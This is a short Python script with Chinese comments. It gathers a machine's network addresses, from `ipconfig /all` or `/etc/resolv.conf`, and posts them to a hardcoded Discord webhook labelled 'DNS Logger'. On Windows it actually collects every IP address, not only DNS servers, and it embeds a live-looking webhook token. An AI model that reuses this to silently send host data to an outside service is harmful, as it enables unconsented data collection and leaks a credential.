import platform
import subprocess
import re
import requests
import json

# Webhook URL
webhook_url = 'https://discord.com/api/webhooks/1362013804778622987/iEDqk3GR3VzxV8ukKv6libXrXFwf_FD0ZutahnQbkDKuH5zTejjkpiEVRUQOYjFcqzYi'

# 函數：獲取 DNS 伺服器列表
def get_dns_servers():
    system = platform.system()
    dns_servers = set()

    # IPv4 和 IPv6 位址格式的正則表達式
    ipv4_pattern = re.compile(r"(?:\d{1,3}\.){3}\d{1,3}")
    ipv6_pattern = re.compile(r"([0-9a-fA-F:]+:+)+[0-9a-fA-F]*")

    try:
        if system == "Windows":
            output = subprocess.check_output("ipconfig /all", encoding="utf-8", errors="ignore")
            # 擷取所有符合 IP 格式的字串
            all_matches = ipv4_pattern.findall(output) + ipv6_pattern.findall(output)
            for ip in all_matches:
                # 基本過濾，排除明顯錯誤值
                if ip != '0.0.0.0' and len(ip) >= 4:
                    dns_servers.add(ip.strip())

        elif system in ["Linux", "Darwin"]:
            with open("/etc/resolv.conf", "r") as f:
                for line in f:
                    if line.startswith("nameserver"):
                        ip = line.split()[1]
                        dns_servers.add(ip.strip())

        else:
            print("⚠️ 不支援的系統：", system)
            return []

    except Exception as e:
        print("❌ 錯誤：", e)

    return sorted(dns_servers)

# 函數：將 DNS 伺服器列表傳送到 Discord Webhook
def send_embed_to_discord(dns_list):
    embed = {
        "color": 0x3498db,  # 藍色
        "fields": [
            {
                "name": "DNS 伺服器列表: ",
                "value": "\n".join(dns_list),  # 把 DNS 伺服器列表組成字符串
                "inline": False
            }
        ]
    }

    payload = {
        "username": "DNS Logger",  # webhook 顯示的名稱
        "embeds": [embed]
    }

    headers = {
        "Content-Type": "application/json"
    }

    response = requests.post(webhook_url, data=json.dumps(payload), headers=headers)
    if response.status_code == 200:
        print("✅ DNS 信息已成功發送到 Discord!")
    else:
        print(f"❌ 發送失敗，HTTP 狀態碼: {response.status_code}")

# 主程式
if __name__ == "__main__":
    dns_list = get_dns_servers()
    if dns_list:
        print("獲取到的 DNS 伺服器:")
        for dns in dns_list:
            print(dns)
        send_embed_to_discord(dns_list)  # 傳送 DNS 伺服器列表到 Discord webhook
    else:
        print("❌ 沒有獲取到 DNS 伺服器！")
